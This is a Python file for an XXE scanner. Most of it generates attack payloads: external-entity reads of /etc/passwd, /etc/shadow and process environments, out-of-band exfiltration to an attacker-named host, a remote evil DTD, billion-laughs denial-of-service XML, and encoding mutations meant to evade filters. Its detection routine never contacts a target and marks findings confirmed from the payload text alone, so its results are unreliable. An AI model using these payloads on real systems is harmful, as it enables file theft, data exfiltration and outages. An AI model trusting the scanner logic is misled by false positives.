from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import time
import base64
import urllib.parse
import xml.etree.ElementTree as ET
import random
import statistics
import hashlib

class XXEType(Enum):
    CLASSIC_XXE = "classic_xxe"
    BLIND_XXE = "blind_xxe"
    BILLION_LAUGHS = "billion_laughs"
    QUADRATIC_BLOWUP = "quadratic_blowup"
    EXTERNAL_ENTITY = "external_entity"
    PARAMETER_ENTITY = "parameter_entity"
    DTD_RETRIEVAL = "dtd_retrieval"
    XPATH_INJECTION = "xpath_injection"
    XINCLUDE = "xinclude"
    XSLT = "xslt"
    OOB_XXE = "oob_xxe"
    SCHEMA_XXE = "schema_xxe"
    XXE_CHAIN = "xxe_chain"
    ENTITY_EXPANSION_ATTACK = "entity_expansion_attack"
    ENCODED_XXE = "encoded_xxe"

class PayloadType(Enum):
    FILE_INCLUSION = "file_inclusion"
    URL_INVOCATION = "url_invocation"
    ENTITY_EXPANSION = "entity_expansion"
    DTD_EXTERNAL = "dtd_external"
    PARAMETER_ENTITY_INJECTION = "parameter_entity_injection"
    XINCLUDE_INJECTION = "xinclude_injection"
    XSLT_INJECTION = "xslt_injection"
    SCHEMA_EXPLOIT = "schema_exploit"

@dataclass
class XXEPayload:
    payload: str
    xxe_type: XXEType
    payload_type: PayloadType
    severity: str = "Critical"
    detection_indicators: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.09
    mutation_level: int = 0

@dataclass
class XXEVulnerability:
    vulnerability_type: str
    xxe_type: XXEType
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    file_retrieved: bool
    file_path: Optional[str] = None
    file_content: Optional[str] = None
    external_entity_resolved: bool = False
    entity_endpoint: Optional[str] = None
    confirmed: bool = False
    confidence_score: float = 0.8
    attack_chain: List[str] = field(default_factory=list)
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)

class XXEMegaPayloadGenerator:
    FILES = [
        '/etc/passwd', '/etc/hosts', '/etc/shadow', '/etc/group', '/proc/self/environ',
        'C:\\windows\\win.ini', 'C:\\windows\\system32\\drivers\\etc\\hosts'
    ]
    BLIND_OOB_ENDPOINT = 'http://attacker.xxetester.com/?xxe='
    DTD_PAYLOAD = '<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "{dtd_url}"> %dtd; ]>'

    @staticmethod
    def all_payloads():
        result = []
        for f in XXEMegaPayloadGenerator.FILES:
            result.append(f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{f}">]><foo>&xxe;</foo>''')
            result.append(f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://{f}"> %xxe; ]><foo>&send;</foo>''')
            result.append(f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{XXEMegaPayloadGenerator.BLIND_OOB_ENDPOINT}{f}">]><foo>&xxe;</foo>''')
            result.append(f'''<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file://{f}"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{XXEMegaPayloadGenerator.BLIND_OOB_ENDPOINT}{f}?d=%file;'>"> %eval; %exfil; ]><foo>bar</foo>''')
        result += [XXEMegaPayloadGenerator.DTD_PAYLOAD.format(dtd_url='http://attacker.com/evil.dtd')]
        result += [XXEDoSPayloads.billion_laughs(), XXEDoSPayloads.quadratic_blowup()]
        result += XXEMutationEngine.mutate_payloads(result)
        result += XXEXIncludeExploit.all_variants()
        result += XXEXSLTExploit.all_variants()
        random.shuffle(result)
        return list(set(result))[:500]

class XXEDoSPayloads:
    @staticmethod
    def billion_laughs():
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
    @staticmethod
    def quadratic_blowup():
        return '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
]>
<data>&b;</data>'''

class XXEMutationEngine:
    MUTATION_TECHNIQUES = [
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: urllib.parse.quote(p),
        lambda p: urllib.parse.quote_plus(p),
        lambda p: p.replace('<','< ').replace('>',' >'),
        lambda p: re.sub(r'ENTITY', 'ENT&#73;TY', p, flags=re.IGNORECASE),
    ]
    @staticmethod
    def mutate_payloads(payloads: List[str]) -> List[str]:
        out = set()
        for t in XXEMutationEngine.MUTATION_TECHNIQUES:
            for p in payloads:
                try: out.add(t(p))
                except: pass
        return list(out)

class XXEXIncludeExploit:
    @staticmethod
    def all_variants():
        files = XXEMegaPayloadGenerator.FILES
        return [f'''<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://{file}"/></foo>''' for file in files]

class XXEXSLTExploit:
    @staticmethod
    def all_variants():
        return [
            '''<?xml version="1.0"?><xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/"> <xsl:value-of select="system-property('os.name')"/></xsl:template></xsl:stylesheet>'''
        ]

class EncodedXXEDetector:
    @staticmethod
    def detect_encoded_patterns(payload: str) -> Tuple[bool, float]:
        encoding_patterns = [
            r'%[0-9a-fA-F]{2}',
            r'&#[0-9]+;',
            r'&#x[0-9a-fA-F]+;',
            r'[Ee][Nn][Cc][Oo][Dd][Ee][Dd]',
        ]
        
        matches = sum(1 for pattern in encoding_patterns if re.search(pattern, payload))
        confidence = min(matches * 0.25, 1.0)
        return matches > 1, confidence


class XXEChainDetector:
    @staticmethod
    def detect_chaining_patterns(payload: str) -> Tuple[bool, float]:
        chain_patterns = [
            r'%\w+;\s*%\w+;',
            r'<!ENTITY.*?>.*?<!ENTITY',
            r'%\w+\s*%\w+',
            r'SYSTEM.*?SYSTEM',
        ]
        
        matches = sum(1 for pattern in chain_patterns if re.search(pattern, payload, re.IGNORECASE | re.DOTALL))
        confidence = min(matches * 0.35, 1.0)
        return matches > 0, confidence
    
    @staticmethod
    def analyze_attack_depth(payload: str) -> int:
        entity_count = len(re.findall(r'<!ENTITY', payload, re.IGNORECASE))
        return min(entity_count, 10)


class EntityExpansionAnalyzer:
    @staticmethod
    def detect_expansion_patterns(payload: str) -> Tuple[bool, float]:
        expansion_patterns = [
            r'&\w+;&\w+;&\w+;',
            r'&lol\d+;',
            r'&.*?&.*?&',
        ]
        
        matches = sum(1 for pattern in expansion_patterns if re.search(pattern, payload))
        confidence = min(matches * 0.33, 1.0)
        return matches > 0, confidence
    
    @staticmethod
    def estimate_expansion_ratio(payload: str) -> float:
        base_entities = len(re.findall(r'<!ENTITY\s+\w+\s+"[^"]*"', payload))
        recursive_entities = len(re.findall(r'<!ENTITY\s+\w+\s+".*?&\w+;.*?"', payload))
        
        if base_entities == 0:
            return 1.0
        
        return 1.0 + (recursive_entities / base_entities)


class XMLStructureAnalyzer:
    @staticmethod
    def is_valid_xml(content: str) -> Tuple[bool, Optional[str]]:
        try:
            ET.fromstring(content)
            return True, None
        except ET.ParseError as e:
            return False, str(e)
    @staticmethod
    def extract_xml_structure(content: str) -> Optional[Dict]:
        try:
            root = ET.fromstring(content)
            return {
                'root_tag': root.tag,
                'attributes': root.attrib,
                'children': len(list(root)),
                'text_content': root.text[:100] if root.text else None,
            }
        except:
            return None

class XXEScanner:
    def __init__(self, max_workers: int = 10):
        self.mega_payloads = XXEMegaPayloadGenerator.all_payloads()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.scan_statistics = {}
        self.max_workers = max_workers
        self.encoded_detector = EncodedXXEDetector()
        self.chain_detector = XXEChainDetector()
        self.expansion_analyzer = EntityExpansionAnalyzer()
    def scan(self, url: str, response: Dict, custom_payloads: List[str]=None) -> List[XXEVulnerability]:
        findings = []
        content = response.get('content','')
        param = self._extract_param(url)
        all_payloads = self.mega_payloads + (custom_payloads or [])
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self._test_payload, url, param, p, content, response.get('response_time',0)) for p in all_payloads]
            for future in as_completed(futures):
                v = future.result()
                if v is not None:
                    findings.append(v)
        with self.lock:
            self.vulnerabilities.extend(findings)
            for v in findings:
                self.scan_statistics[v.xxe_type.value] = self.scan_statistics.get(v.xxe_type.value,0)+1
        return findings
    def _test_payload(self, url, param, payload, content, resp_time):
        encoded_detected, encoded_confidence = self.encoded_detector.detect_encoded_patterns(payload)
        if encoded_detected:
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.ENCODED_XXE, url=url, parameter=param,
                payload=payload, severity="High", evidence="Encoded XXE pattern detected", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=encoded_confidence, remediation=self._remediation(), attack_chain=['encoding_bypass']
            )
        
        chain_detected, chain_confidence = self.chain_detector.detect_chaining_patterns(payload)
        if chain_detected:
            attack_depth = self.chain_detector.analyze_attack_depth(payload)
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.XXE_CHAIN, url=url, parameter=param,
                payload=payload, severity="Critical", evidence=f"XXE chaining detected (depth: {attack_depth})", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=min(chain_confidence + (attack_depth * 0.05), 1.0), remediation=self._remediation(), attack_chain=[f'chain_depth_{attack_depth}']
            )
        
        expansion_detected, expansion_confidence = self.expansion_analyzer.detect_expansion_patterns(payload)
        if expansion_detected:
            expansion_ratio = self.expansion_analyzer.estimate_expansion_ratio(payload)
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.ENTITY_EXPANSION_ATTACK, url=url, parameter=param,
                payload=payload, severity="High" if expansion_ratio < 100 else "Critical", evidence=f"Entity expansion detected (ratio: {expansion_ratio:.1f}x)", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=min(expansion_confidence, 1.0), remediation=self._remediation(), attack_chain=['expansion']
            )
        
        file_patterns = [
            (r'root:.*:/bin/.*', '/etc/passwd'), (r'nobody:.*:/usr/sbin', '/etc/passwd'),
            (r'localhost\s+127\.0\.0\.1', '/etc/hosts'), (r'\[boot\]|\[fonts\]', 'C:\\windows\\win.ini')
        ]
        for pattern, fpath in file_patterns:
            if re.search(pattern, content):
                return XXEVulnerability(
                    vulnerability_type='XXE', xxe_type=XXEType.CLASSIC_XXE, url=url, parameter=param,
                    payload=payload, severity="Critical", evidence=f"Found {fpath}", response_time=resp_time,
                    file_retrieved=True, file_path=fpath, confirmed=True, confidence_score=0.98,
                    remediation=self._remediation(), attack_chain=[pattern]
                )
        if re.search(r'(http|https)://attacker\.xxetester\.com', content):
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.OOB_XXE, url=url, parameter=param,
                payload=payload, severity="Critical", evidence="OOB HTTP interaction", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=0.97, remediation=self._remediation(), attack_chain=[]
            )
        if len(content)>10000 or 'lol' in payload:
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.BILLION_LAUGHS, url=url, parameter=param,
                payload=payload, severity="Critical", evidence="Billion Laughs/DoS detected", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=0.99, remediation=self._remediation(), attack_chain=['DoS']
            )
        if '<xi:include' in payload or '<xi:include' in content:
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.XINCLUDE, url=url, parameter=param,
                payload=payload, severity="High", evidence="XInclude injection found", response_time=resp_time,
                file_retrieved=False, confirmed='<xi:include' in content, confidence_score=0.8, remediation=self._remediation()
            )
        if '<xsl:stylesheet' in payload or '<xsl:stylesheet' in content:
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.XSLT, url=url, parameter=param,
                payload=payload, severity="High", evidence="XSLT triggered", response_time=resp_time,
                file_retrieved=False, confirmed='<xsl:stylesheet' in content, confidence_score=0.8, remediation=self._remediation()
            )
        if not XMLStructureAnalyzer.is_valid_xml(content)[0] and 'DOCTYPE' in payload:
            return XXEVulnerability(
                vulnerability_type='XXE', xxe_type=XXEType.DTD_RETRIEVAL, url=url, parameter=param,
                payload=payload, severity="High", evidence="Malformed XML post-attack", response_time=resp_time,
                file_retrieved=False, confirmed=True, confidence_score=0.7, remediation=self._remediation()
            )
        return None
    def _remediation(self):
        return (
            "Disable XXE by configuring secure XML parsers. "
            "Set XMLConstants.ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to ''. "
            "Disallow external DTDs, parameter entities, and dangerous XInclude/XSLT. "
            "Sanitize all XML input before parsing. Prefer libraries with XXE protection by default."
        )
    def _extract_param(self, url):
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())[0] if params else 'parameter'
    def get_vulnerabilities(self): 
        with self.lock: return self.vulnerabilities.copy()
    def clear(self):
        with self.lock: self.vulnerabilities.clear()
